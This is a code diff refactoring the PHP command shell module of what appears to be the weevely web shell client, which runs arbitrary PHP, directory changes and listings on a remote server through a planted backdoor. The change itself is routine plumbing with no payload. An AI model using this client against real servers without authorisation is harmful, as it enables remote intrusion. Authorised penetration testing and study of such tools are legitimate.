@@ -14,7 +14,11 @@ classname = 'Php'
     
     
 class Php(Module):
-    '''Shell to execute PHP commands'''
+    '''Shell to execute PHP commands
+    
+    Every run should be run_module to avoid recursive
+    interpreter probing
+    '''
     
     params = ParametersList('PHP command shell', [],
                              P(arg='cmd', help='PHP commands. Terminate with semi-comma', required=True, pos=0),
@@ -29,6 +33,8 @@ class Php(Module):
         self.cwd_vector = None
         self.path = None
         self.proxy = None
+
+        self.modhandler = modhandler        
         
         self.post_data = {}
         
@@ -43,16 +49,16 @@ class Php(Module):
             self.modes = [ mode ]
         else:
             self.modes = self.available_modes
-        
-        
-        Module.__init__(self, modhandler, url, password)
-        
+
         proxy = self.params.get_parameter_value('proxy')
         if proxy:
             self.mprint('[!] Proxies can break weevely requests, if possibile use proxychains')
             self.proxy = { 'http' : proxy }
 
         
+        Module.__init__(self, modhandler, url, password)
+        
+                
 
     def _probe(self):
         
@@ -60,16 +66,16 @@ class Php(Module):
             
             rand = str(random.randint( 11111, 99999 ))
             
-            if self.run({ 0 : 'echo %s;' % (rand) }) == rand:
+            if self.run_module('echo %s;' % (rand)) == rand:
                 self.current_mode = currentmode
-                self.params.set_and_check_parameters({'mode' : currentmode}, False)
+                #self.params.set_and_check_parameters({'mode' : currentmode}, False)
                 break
         
         if not self.current_mode:
             raise ModuleException(self.name,  "PHP interpreter initialization failed")
         else:
             
-            if self.run({ 0: 'is_callable("is_dir") && is_callable("chdir") && print(1);' }) != '1':
+            if self.run_module('is_callable("is_dir") && is_callable("chdir") && print(1);') != '1':
                 self.mprint('[!] Error testing directory change methods, \'cd\' and \'ls\' will not work.')
             else:
                 self.cwd_vector = "chdir('%s') && %s" 
@@ -81,7 +87,7 @@ class Php(Module):
         self.post_data = post_data
        
        
-    def run_module(self, cmd, mode, proxy):
+    def run_module(self, cmd, mode = None, proxy = None):
 
         if mode:
             self.mode = mode
@@ -89,7 +95,7 @@ class Php(Module):
         if proxy:
             self.mprint('[!] Proxies can break weevely requests, if possibile use proxychains')
             self.proxy = { 'http' : proxy }
-            
+        
 
         if self.use_current_path and self.cwd_vector and self.path:
             cmd = self.cwd_vector % (self.path, cmd)
@@ -125,7 +131,7 @@ class Php(Module):
     def cwd_handler (self, path):
         
         self.use_current_path = False
-        response = self.run({ 0 : "is_dir('%s') && print(1);" % path })
+        response = self.run_module( "is_dir('%s') && print(1);" % path )
         self.use_current_path = True
         if response == '1':
             self.path = path
@@ -148,7 +154,7 @@ class Php(Module):
             
         
         self.use_current_path = False
-        response = self.run( { 0:  ls_vector % (path) })
+        response = self.run_module( ls_vector % (path) )
         self.use_current_path = True
         
         if not response:
